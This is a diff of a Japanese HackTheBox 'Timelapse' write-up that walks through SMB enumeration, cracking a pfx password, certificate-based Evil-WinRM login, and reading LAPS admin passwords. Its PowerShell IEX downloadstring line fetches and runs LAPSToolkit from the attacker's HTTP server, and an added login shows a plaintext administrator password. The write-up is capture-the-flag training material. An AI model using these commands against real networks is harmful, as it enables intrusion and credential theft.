@@ -40,7 +40,7 @@ SMB         10.129.227.113  445    DC01             NETLOGON                    
 SMB         10.129.227.113  445    DC01             Shares          READ            
 SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
 ```
-shares内を列挙、クレデンシャルっぽいzipファイルをダウンロード
+shares内を列挙、winrmのクレデンシャルっぽいzipファイルをダウンロード
 ```sh
 └─$ netexec smb 10.129.227.113 -u ' ' -p '' --share 'Shares' -M spider_plus
 SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
@@ -134,7 +134,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 zip解凍、pfxファイルを入手  
-pfxから証明書ファイルに変換を試みたがここでもパスワードあり
+ポートスキャンで5986番が開いていることを確認したが、Evil-WinrmでPass The CertificateするためにはPEMファイルが必要  
+pfxからPEMファイルに変換を試みたがここでもパスワードあり
 ```sh
 └─$ unzip winrm_backup.zip
 Archive:  winrm_backup.zip
@@ -161,7 +162,7 @@ thuglegacy       (legacyy_dev_auth.pfx)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-pfxから公開鍵証明書と秘密鍵を入手
+pfxから公開鍵証明書と秘密鍵のPEMファイル入手
 ```sh
 └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
 Enter Import Password:
@@ -173,7 +174,7 @@ Enter Import Password:
 -rw------- 1 kali kali 1952 Sep 28 08:42 privkey.pem
 -rw------- 1 kali kali 1232 Sep 28 08:41 cert.crt
 ```
-5986番が開いていおり、winrmでログイン成功！  
+winrmでログイン成功！  
 ユーザフラグゲット
 ```sh
 └─$ evil-winrm -S -c cert.crt -k privkey.pem -r timelapse.htb -i 10.129.227.113
@@ -563,7 +564,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 
-## STEP 3
+## STEP 4
 svc_deployはLAPS_Readersグループに所属しているっぽい  
 名前からしてLAPS系のなにかっぽい
 ```powershell
@@ -604,7 +605,7 @@ The command completed successfully.
 └─$ python3.13 -m http.server               
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-lapstoolkitのコマンドにより、LAPS_ReadersグループがLAPSを読み取れることを確認
+lapstoolkitのコマンドにより、LAPS_ReadersグループがLAPSを読み取れることを確認  
 併せてdc01.timelapse.htbのローカル管理者のパスワードゲット！
 ```powershell
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(new-object net.webclient).downloadstring('http://10.10.16.30:8000/LAPSToolkit.ps1')
@@ -694,6 +695,18 @@ The command completed successfully.
 lapsで取得したパスワードでadministratorログイン成功！
 ルートフラグゲット
 ```sh
+└─$ evil-winrm -S -u administrator -p '7@r[+C)c%/+9H2A9VQR.@D2D' -i 10.129.227.113
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\TRX\Desktop\root.txt
 323cf24b854b2e21c2903de92003ce24
 ```
